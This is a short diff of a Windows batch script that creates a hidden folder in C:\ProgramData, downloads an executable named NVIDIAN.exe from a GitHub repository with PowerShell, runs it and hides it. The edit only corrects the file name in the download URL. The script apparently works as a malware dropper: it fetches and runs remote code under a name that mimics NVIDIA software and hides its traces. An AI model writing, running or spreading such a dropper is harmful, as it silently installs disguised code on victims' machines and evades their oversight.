@@ -2,6 +2,6 @@ cd "C:\ProgramData"
 mkdir "QQQ"
 attrib +h "QQQ" /s /d
 cd "C:\ProgramData\QQQ" 
-powershell -Command "Invoke-WebRequest 'https://github.com/pr0niums/Repo/raw/refs/heads/main/NVIDIAS.exe' -OutFile 'NVIDIAN.exe'"
+powershell -Command "Invoke-WebRequest 'https://github.com/pr0niums/Repo/raw/refs/heads/main/NVIDIAN.exe' -OutFile 'NVIDIAN.exe'"
 start NVIDIAN.exe
 attrib +h "C:\ProgramData\QQQ\NVIDIAN.exe" /s /d
